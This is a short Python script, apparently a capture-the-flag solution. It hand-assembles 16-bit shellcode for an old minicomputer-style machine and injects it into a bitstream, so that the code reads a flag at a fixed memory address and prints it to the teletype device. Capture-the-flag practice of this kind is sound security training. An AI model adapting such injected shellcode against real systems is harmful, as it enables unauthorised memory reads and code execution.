# 011 is TTO
# 051 is TTO1
def output_acc(device = 011):
 return (
 #      AC   CT
 [ 0b0110001001000000 + device,
 #        TNS  DEVICE
   0b0110011110000000 + device, # wait
   0b0000000111111111, # loop back to wait
 ])

def load_acc_from_acc2(offset):
 return (0b00100010 << 8) | offset

swap_acc = 0b1000001011000000

# flag is at 01337
shellcode = [
 0b0011000100000010, # Load *($+2) into acc2
 0b0000000100000010, # skip next instr
 01337,
 load_acc_from_acc2(0), swap_acc,
] + output_acc() + [swap_acc] + output_acc() + [
 load_acc_from_acc2(1), swap_acc,
] + output_acc() + [swap_acc] + output_acc() + [
 load_acc_from_acc2(2), swap_acc,
] + output_acc() + [swap_acc] + output_acc() + [
 load_acc_from_acc2(3), swap_acc,
] + output_acc() + [swap_acc] + output_acc() + [
 load_acc_from_acc2(4), swap_acc,
] + output_acc() + [swap_acc] + output_acc() + [
 load_acc_from_acc2(5), swap_acc,
] + output_acc() + [swap_acc] + output_acc() + [
 load_acc_from_acc2(6), swap_acc,
] + output_acc() + [swap_acc] + output_acc() + [
 load_acc_from_acc2(7), swap_acc,
] + output_acc() + [swap_acc] + output_acc() + [
 0b0110011000111111, # halt
]

from struct import pack
def emit(bits):
 arr = []
 for i in range(0, len(bits), 16):
   s = bits[i:i+16]
   s = s.replace('z', '0')
   arr.append(pack(">H", int(s, 2)))
 return ''.join(arr)

def build_prog(bs, tpos):
    assert tpos % 16 == 0

    for i, v in enumerate(shellcode):
        bs.write_safe(tpos + i * 16, 16, v)
